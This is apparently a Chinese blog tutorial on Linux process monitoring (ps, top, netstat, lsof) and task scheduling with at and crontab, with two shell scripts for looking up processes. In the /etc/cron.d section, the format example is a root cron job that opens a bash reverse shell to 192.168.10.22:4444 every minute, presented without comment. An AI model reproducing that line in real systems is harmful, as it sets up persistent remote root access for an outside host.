**目录**

[一：监视系统进程（ps 、top）](#t0)

[二：查看网络连接信息 (netstat)](#t1)

[三：文件进程、端口关联（lsof）](#t2)

[四：计划任务管理（at 、crontab）](#t3)

[at](#t4)

[crontab](#t5)

* * *

一：监视系统进程（ps 、top）
-----------------

程序：保存在硬盘、光盘等介质中的可执行代码和数据，静态保存的代码  
进程：在cpu及内存中运行的程序代码，动态执行的代码，每个进程可以有多个子进程(线程)  
PID ： 标识进程的唯一标识

ps：静态查看系统进程  
top：动态查看系统进程  
pgrep：表示查看指定服务的PID       如：  pgrep  httpd    查看httpd服务的PID

*   \-u  表示查看指定用户的进程信息          比如：pgrep -u named httpd                                                                

第一个参数named为named用户，第二个参数表示进程名称为 httpd ，表示查看named用户的httpd进程的PID。与 ps  -aux | grep httpd  同样的作用

pstree：以树状结构显示进程的关联信息

**进程后台管理**

*   Ctrl+z    前台进程调入后台，挂起，进程并没有死，只是卡在那里
*   Ctrl+c    结束进程
*   jobs      查看后台进程
*   fg 3      将后台第3个进程在前台运行（不加数字时，jobs程序上为‘+’的程序优先被调回）
*   bg 2     将后台第2个进程在后台运行（不加数字时，jobs程序上为‘+’的程序优先被调回）
*   &          直接将进程放在后台运行
*   kill        向进程发送信号，不加参数时，默认发送 kill 信号 。强制杀掉进程： kill -s  9  PID   这里是 -s  9 参数的作用的传递给进程的信号是9，即强制终止，结束进程
*   killall    杀死同一命令的所有进程

**top :** 反应系统进程动态信息，默认每3秒更新一次，顶部始终显示系统当前最活跃的进程，此时还可以接受用户的键盘输入向进程发送信号等待

![](https://img-blog.csdn.net/20180829192724589?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

*   PID：进程ID
*   USER：运行进程的用户
*   PR：系统默认的优先级，PR总是比NI大20
*   NI：用户可以修改的优先级。范围从-20~19 ，数字越小值越大。当进程已经运行时，可以使用 renice 命令修改其优先级：renice  -n   -20  PID   。当进程没运行时，可以使用 nice -n 20  httpd  开启进程的时候指定优先级
*   VIRT：虚拟内存
*   RES： 当前进程使用的内存
*   SHR：共享内存
*   S ： 状态 S(sleep) 或者 R(running)
*   %CPU：进程所占CPU的比重
*   %MEM: 进程所占内存的比重
*   Time : 进程运行的时间
*   COMMAND: 进程的指令

此时输入 u 键，然后输入 root 并按回车键，则此时输出信息显示root所占资源信息

![](https://img-blog.csdn.net/20180829193405771?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

如果输入的是 k，然后输入你要杀死的进程ID，连续回车两次，那个进程就被杀掉了

![](https://img-blog.csdn.net/20180829193446970?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

如果输入的是 M ，表示按照内存占用情况排序  
如果输入的是 P  ，表示按照CPU占用情况排序

**ps** : ps是Process Status的缩写，用来列出系统中当前运行的那些进程。ps命令列出的是当前进程的快照，就是执行ps命令这个时刻的进程，与 top 不同的是，ps 是静态查看进程

1.  PID：运行着的进程的ID；
2.  TTY：命令所运行的位置
3.  TIME：运行着的该命令所占用的CPU处理时间
4.  CMD：该进程所运行的命令

![](https://img-blog.csdn.net/20180829193725751?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**ps   aux :** 

*   a 选项表示查看所有进程信息
*   u 选项表示显示进程所属的用户信息
*   x 选项表示显示默认信息以外的信息 

![](https://img-blog.csdnimg.cn/20190712211855333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**ps -ef**

*   e参数代表全部进程
*   f参数代表全格式

![](https://img-blog.csdnimg.cn/20190712211925936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

UID ：运行进程的用户  
PID ：进程的编号  
%CPU：进程所占CPU的比重  
%MEM: 进程所占内存的比重  
VSZ: 虚拟内存  
RSS：共享内存  
TTY：当前是否有终端登录，？表示没有   
STAT：  
        S：当前状态为睡眠状态  
        s：当前进程有多个子进程  
        l：当前进程可能会开启多个子进程  
        R：当前进程正在运行中  
        +：表示这个进程在前台运行  
        Z：表示僵尸进程  
        <：表示当前进程优先级高  
START : 进程开始的时间  
Time : 进程运行的时间  
COMAND :  进程的命令所在的目录

有关于 ps aux和ps -ef的区别：[聊聊 ps aux 和 ps -elf](https://blog.51cto.com/10412806/2154827)

结果默认是未排好序的，如果想通过cpu使用情况来排序，可以加参数： \--sort   -pcpu 

![](https://img-blog.csdnimg.cn/20190712212025723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果想通过内存来排序，可以加参数： \--sort   -pmem

![](https://img-blog.csdnimg.cn/20190712212109453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果想通过进程开启时间来排序，可以加参数，\--sort=lstart ，从最开始启动的进程排序到最后启动的进程

根据用户来筛选进程：  ps  -u  root

![](https://img-blog.csdn.net/20180829194531204?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

根据进程名筛选： ps -C gnome-shell

![](https://img-blog.csdn.net/20180829194720414?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

根据进程筛选： ps -L 613

![](https://img-blog.csdn.net/20180829194918125?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

显示安全信息，如果想要查看有谁登陆了你的服务器，可以使用  ps -eo  pid,user,args   
\-e显示所有进程信息，-o参数控制输出， pid，user，args显示应用的PID，运行应用的用户和该应用

![](https://img-blog.csdn.net/20180829195205514?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

实时监控进程状态    watch  -n  5 ' ps -aux  --sort  -pmem  '    。意思是每隔5秒按照内存排序查看进程信息

![](https://img-blog.csdn.net/20180829195428672?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**一个根据PID过滤的出当前PID所对应的进程的信息的脚本**

```
#! /bin/bash      
# Author:谢公子      
# Date:2018-10-10      
# Function: 根据用户输入的PID，过滤出该PID所有的信息      
read -p "请输入要查询的PID: " P      
n=`ps -aux| awk '$2~/^'$P'$/{print $11}'|wc -l`      
if [ $n -eq 0 ];then      
 echo "该PID不存在！！"      
 exit      1
fi      1
echo "--------------------------------"      1
echo "进程PID: $P"      1
echo "进程命令：`ps -aux| awk '$2~/^'$P'$/{print $11}'`"      1
echo "进程所属用户: `ps -aux| awk '$2~/^'$P'$/{print $1}'`"      1
echo "CPU占用率：`ps -aux| awk '$2~/^'$P'$/{print $3}'`%"      1
echo "内存占用率：`ps -aux| awk '$2~/^'$P'$/{print $4}'`%"      1
echo "进程开始运行的时刻：`ps -aux| awk '$2~/^'$P'$/{print $9}'`"      1
echo "进程运行的时间：`ps -aux| awk '$2~/^'$P'$/{print $10}'`"      1
echo "进程状态：`ps -aux| awk '$2~/^'$P'$/{print $8}'`"      2
echo "进程虚拟内存：`ps -aux| awk '$2~/^'$P'$/{print $5}'`"      2
echo "进程共享内存：`ps -aux| awk '$2~/^'$P'$/{print $6}'`"      2
echo "--------------------------------"
```


脚本运行截图，输入PID 即可查看PID所对应的进程信息

![](https://img-blog.csdn.net/2018101315561375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**一个根据进程名过滤出当前进程所有PID进程的信息**

```
#! /bin/bash      
# Author:谢公子      
# Date：2018-10-10      
# Function: 根据输入的程序的名字过滤出所对应的PID，并显示出详细信息，如果有几个PID，则全部显示      
read -p "请输入要查询的进程名：" NAME      
N=`ps -aux | grep $NAME | grep -v grep | wc -l`    ##统计进程总数      
if [ $N -le 0 ];then      
  echo "该进程名没有运行！"      
fi      1
i=1      1
while [ $N -gt 0 ]      1
do      1
  echo "进程PID: `ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $2}'`"      1
  echo "进程命令：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $11}'`"      1
  echo "进程所属用户: `ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $1}'`"      1
  echo "CPU占用率：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $3}'`%"      1
  echo "内存占用率：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $4}'`%"      1
  echo "进程开始运行的时刻：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $9}'`"      1
  echo "进程运行的时间：`  ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $11}'`"      2
  echo "进程状态：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $8}'`"      2
  echo "进程虚拟内存：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $5}'`"      2
  echo "进程共享内存：`ps -aux | grep $NAME | grep -v grep | awk 'NR=='$i'{print $0}'| awk '{print $6}'`"      2
  echo "***************************************************************"      2
  let N-- i++      2
done
```


 脚本运行截图，输入进程名即过滤出该进程名所对应的所有线程的信息

![](https://img-blog.csdn.net/20181010221313221?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

二：查看网络连接信息 (netstat)
--------------------

**netstat** : 该命令用于显示各种网络相关信息，如网络连接，路由白边，接口状态，masquerade 连接，多播成员等

![](https://img-blog.csdn.net/20180829195819491?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

命令的输出有两部分，第一部分是Active Internet connections，称为有源TCP连接，  
其中"Recv-Q"和"Send-Q"指的是接收队列和发送队列，这些数字一般都应该是0，如果不是则表示软件包正在队列中堆积。  
第二部分是Active UNIX domain sockets，称为有源 Unix 域套接口(和网络套接字一样，但是只能用于本机通信，性能比网络套接字高一倍)。

*   Proto 表示连接使用的协议
*   RefCnt 表示连接到本套接字口上的进程号
*   Types 表示套接口的类型：STREAM表示TCP套接字，DGRAM表示UDP套接字
*   State 表示套接口当前的状态
*   Path 表示连接到套接口的进程所使用的路径名。

注：netstat命令默认是不显示 LISTEN 状态的网络连接和 LISTEING 状态的 UNIX 域连接，只有使用带 -a 或者 -l 参数的命令才能显示

命令参数

*      -a (all)显示所有状态的连接
*       -l 列出有在监听状态的连接
*       -t (tcp) 显示tcp相关连接
*       -u (udp) 显示udp相关连接
*       -n 拒绝显示别名，能显示数字的全部转化成数字。
*       -p 显示建立相关链接的程序名
*       -r 显示路由信息，路由表
*       -e 显示扩展信息，例如uid等
*       -s 按各个协议进行统计
*       -c 每隔一个固定时间，执行该netstat命令

常用命令

 netstat  -pantu     ： 查看计算机和网络中的哪些计算机产生了连接

![](https://img-blog.csdn.net/20180829200256601?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

netstat  -pantu | grep 80  : 查看http服务（80端口）是否开启

![](https://img-blog.csdn.net/20180829200835998?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

三：文件进程、端口关联（lsof）
-----------------

**lsof** : （list open files）是一个列出当前系统进程打开文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议(TCP)和用户数据报协议(UDP)套接字等，系统在后台都为该应用程序分配了一个文件描述符FD(文件描述符位置  /proc/PID/fd/ )，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统检测以及排错将是很有帮助的

![](https://img-blog.csdn.net/20180829202344604?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

*   COMMAND：进程的名称
*   PID：进程标识符
*   USER：进程所有者
*   FD：文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等
*   TYPE：文件类型，如DIR、REG等
*   DEVICE：指定磁盘的名称
*   SIZE：文件的大小
*   NODE：索引节点（文件在磁盘上的标识）
*   NAME：打开文件的确切名称

**常用命令**

*   lsof  |  grep  abc.txt        显示开启文件abc.txt的进程
*   lsof   -c abc         显示abc进程现在打开的文件
*   lsof   -p 1234        列出进程号为1234的进程所打开的文件
*   lsof   -g  gid          显示归属gid的进程情况
*   lsof   +d     /usr/local/     显示目录下被进程开启的文件
*   lsof   +D   /usr/local/      同上，但是会递归搜索目录下的目录
*   lsof   -d 4                显示使用文件描述符为4的进程
*   lsof   -i:端口号                  用以显示符合条件的进程情况

```
lsof -p 699  #显示PID为699的进程打开的所有文件
```


![](https://img-blog.csdnimg.cn/20190712212517699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

显示与22端口有关的进程

```
lsof -i:22 #打开所有与22端口有关的进程
```


![](https://img-blog.csdnimg.cn/20190712213015143.png)

```
ls -lh /proc/699/exe   #显示PID为699的进程的启动程序
```


![](https://img-blog.csdnimg.cn/20190712213258560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
cp /proc/699/exe 1  #复制PID为699的进程的启动程序为1
```


![](https://img-blog.csdnimg.cn/20190712213524404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**四：计划任务管理（at 、crontab）**
-------------------------

### **at**

**at** ：一次性[计划任务](https://so.csdn.net/so/search?q=%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1&spm=1001.2101.3001.7020) ，服务脚本 /etc/init.d/atd  (rhel6)               /usr/lib/systemd/system/atd（rhel7）

设置格式： 

*   at   20:00         今天20:00 
*   at   3am+2days        两天后的凌晨三点
*   at   now+30minutes    30分钟后
*   at   3:00  2015-7-17

结束：ctrl + d

查询 ：atq   或    at   -l  
删除 ：atrm  2  
查询指定计划任务内容：at  -c   2

有关时间的文章：[date命令查看时间](https://blog.csdn.net/qq_36119192/article/details/82813477#date)

### crontab

crontab：周期性计划任务，按照预先设置的时间周期执行用户指定命令的操作

**主要配置文件**

*   全局配置文件： /etc/crontab文件 和 /etc/cron.d/  目录内的文件
*   黑名单文件：/etc/cron.deny        白名单文件：/etc/cron.allow （默认是没有的，用户可自己创建，但是创建了之后就要指定用户），白名单优先级大于黑名单
*   用户定义的配置文件 /var/spool/cron/用户名

crond每分钟会去/etc/cron.d 目录里面搜索配置文件，里面有一个 0hourly 文件，里面写了 01 \* \* \* \* root run-parts /etc/cron.hourly。意思是每隔1小时去运行一次 /etc/cron.hourly/ 目录，/etc/cron.hourly/ 目录下面有一个0anacron文件，这样0anacron 文件就能每小时运行一次。0anacron 按照 /etc/anacrontab 文件里面的配置，将当前时间与 /var/spool/anacron 目录下面的文件里面的时间戳作对比，如果需要则去运行 /etc/anacrontab 对应的条目。这也是为什么 /etc/anacrontab 文件里面只定义了cron.daily、cron.weekly与cron.monthly，而没有定义cron.hourly，因为cron.daily、cron.weekly 与 cron.monthly 其实是由cron.hourly调起来的。每小时运行的 0anacron 只负责进行时间戳的比对，如果当前日期和上次运行 anacron 的日期不符，说明系统停机过了，就会启动 anacron 这支程序，再由 anacron 根据 /etc/anacrontab 配置进一步判断，然后去运行cron.daily、cron.weekly 与 cron.monthly 里面未完成的任务

![](https://img-blog.csdnimg.cn/20191030230217541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**/etc/crontab** 文件只能由 root 用户编辑修改，[crontab](https://so.csdn.net/so/search?q=crontab&spm=1001.2101.3001.7020)文件里存放着定时任务，crontab里面的定时任务需要指定用户。cron服务不仅每分钟要读一次 /var/spool/cron 内的所有文件，还需要读一次/etc/crontab 配置文件,因此我们配置这个文件也能运用 cron 服务做一些事情。用crontab -e进行的配置是针对某个用户的，而编辑/etc/crontab是针对系统的任务。我们也可以在里面添加针对用户的定时任务，此文件的文件格式是格式如下

![](https://img-blog.csdnimg.cn/20191030230324530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

/etc/cron.d 是一个目录，目录内存放着一些定时任务。只有root用户有权限在该目录下创建定时任务文件，该目录下的定时任务需要指定用户，格式如下

```
*  *  *  *  *  root  /bin/bash -i>&/dev/tcp/192.168.10.22/4444 0>&1
```


![](https://img-blog.csdnimg.cn/20191030231410913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**/etc/cron.(hourly/daily/weekly/monthly)**  是四个目录，目录内存放着一些定时任务。只有root用户有权限在该目录下创建定时任务文件，直接写脚本文件即可。创建完成后，需要赋予该文件可执行权限x。这四个目录/etc/cron.(hourly/daily/weekly/monthly)下的脚本分别每小时、每天、每周、每月执行。

![](https://img-blog.csdnimg.cn/20191030230057510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

编辑计划任务:   crontab  -e -u  用户名      此命令会在 /var/spool/cron 下创建一个以用户名为文件名的定时任务文件  
查看计划任务:   crontab  -l  -u  用户名  
删除计划任务:   crontab  -r  -u  用户名

注：如果没有指定用户名，则默认为当前用户

编辑计划任务

```
 有6个参数，分别代表 分、时、天、月、周、要执行的命令 。如果打开的时候没指定用户名，则这里也不需要写用户名，代表当前编辑用户       
 .---------------- minute (0 - 59)      
 |  .------------- hour (0 - 23)      
 |  |  .---------- day of month (1 - 31)      
 |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...      
 |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat      
 |  |  |  |  |      
 *  *  *  *  *   command        1
*号代表每一 ，比如       1
*/5  *  15-20  7-8  3-4   command   每五分钟，每一个小时，一个月的15-20号，一年的7-8月，一周的周3-周4 执行命令      1
这里的command命令可以是一个可执行文件的路径,也可以是一条命令
```


例：

在/bin/下有一个1.sh的脚本文件， 其内容是   cp  /var/log/messages   /tmp/log.\`date +%F:%H:%M\`   

意思是备份日志文件到tmp目录，并且以当前的时间命名

然后我们创建一个周期性任务

```
#这个计划任务就是每个月的28-30号的，每天的0-6点，每隔两分钟备份一次日志文件并以当前的时间命名      
*/2      0-6     28-30     *     *      /bin/1.sh      
*/2      0-6     28-30     *     *    cp  /var/log/messages   /tmp/log.`date +%F:%H:%M`       
#每隔一分钟执行      
*/1  *  *  *  *   command      
#每小时的第一分钟执行      
1  *  *  *  *     command      
#每天的9-17点的每个小时执行一次      1
0  9-17  *  *  *  command      1
#每天的9-17点的每隔3小时(也就是180分钟)执行一次      1
*/180  9-17  *  *  *  command      1
#每天的5点4分执行      1
4  5  *  *  *  command      1
#每周的星期2的5点4分执行      1
4  5  *  *  2  command      1
#每周的星期一-星期五的5点4分执行      1
4  5  *  *  1-5  command      1
#每月的第3天的5点4分执行      2
4  5  3  *  *  command
```


关于Crontab定时任务设置的在线网站：[https://crontab.guru/#](https://crontab.guru/#)

相关文件：[Linux下磁盘分区、卸载和磁盘配额](https://blog.csdn.net/qq_36119192/article/details/82350984)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10949 人正在系统学习中